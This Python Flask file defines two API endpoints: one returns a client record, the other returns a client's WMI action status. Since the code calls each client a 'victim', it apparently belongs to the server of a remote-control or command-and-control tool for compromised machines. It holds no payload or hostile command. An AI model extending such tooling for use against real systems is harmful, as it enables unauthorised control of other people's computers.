from server.app.api import api_blueprint
from server.app.models import Client
from flask import jsonify


@api_blueprint.route('/clients/<int:client_id>', methods=['GET'])
def get_client(client_id: int):
    return jsonify(Client.query.get_or_404(client_id).to_dict())


@api_blueprint.route('/clients/<int:client_id>/action_status', methods=['GET'])
def get_client_actions(client_id: int):
    victim = Client.query.get_or_404(client_id)
    return jsonify(victim.wmi_action_dict)
